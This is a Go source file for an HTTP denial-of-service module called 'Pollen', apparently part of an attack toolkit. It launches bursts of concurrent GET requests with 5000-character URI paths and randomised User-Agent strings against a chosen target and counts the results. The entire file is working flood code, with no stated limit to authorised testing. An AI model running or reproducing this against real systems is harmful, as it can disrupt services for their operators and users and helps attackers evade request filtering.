package sting

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"vivarium/internal/common"
)

// Pollen implements the NFSBug pattern attack (formerly SPRAY).
// Bursts requests with oversized URI paths like pollen scattered by wind.
type Pollen struct {
	client *http.Client
}

// NewPollen creates a new Pollen Burst attack instance.
func NewPollen() *Pollen {
	return &Pollen{
		client: common.FastHTTPClient(),
	}
}

// Name returns the attack name.
func (p *Pollen) Name() string {
	return "Pollen"
}

// Description returns a brief description.
func (p *Pollen) Description() string {
	return "Pollen Burst - scatters oversized URI requests like wind-borne pollen"
}

// Attack executes the Pollen Burst attack.
func (p *Pollen) Attack(ctx context.Context, target string, opts AttackOpts) (*Result, error) {
	if opts.Concurrency <= 0 {
		opts.Concurrency = 100
	}
	if opts.Rounds <= 0 {
		opts.Rounds = 1000
	}

	var (
		successful atomic.Int64
		failed     atomic.Int64
		completed  atomic.Int64
	)

	start := time.Now()

	// Generate oversized path like scattered pollen
	pollenPath := strings.Repeat("A", 5000)

	jobs := make(chan int, opts.Rounds)
	var wg sync.WaitGroup

	for i := 0; i < opts.Concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case _, ok := <-jobs:
					if !ok {
						return
					}
					if p.sendRequest(ctx, target, pollenPath) {
						successful.Add(1)
					} else {
						failed.Add(1)
					}
					current := completed.Add(1)

					if opts.Verbose && current%100 == 0 {
						fmt.Printf("\r   Progress: %d/%d requests", current, opts.Rounds)
					}

					if opts.Delay > 0 {
						time.Sleep(opts.Delay)
					}
				}
			}
		}()
	}

	for i := 0; i < opts.Rounds; i++ {
		select {
		case <-ctx.Done():
			break
		case jobs <- i:
		}
	}
	close(jobs)

	wg.Wait()

	if opts.Verbose {
		fmt.Println()
	}

	return &Result{
		TotalRequests: int(completed.Load()),
		Successful:    int(successful.Load()),
		Failed:        int(failed.Load()),
		Duration:      time.Since(start),
	}, nil
}

func (p *Pollen) sendRequest(ctx context.Context, target, pollenPath string) bool {
	url := target
	if !strings.HasSuffix(url, "/") {
		url += "/"
	}
	url += pollenPath

	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", common.RandomUserAgent())

	resp, err := p.client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)

	return true
}
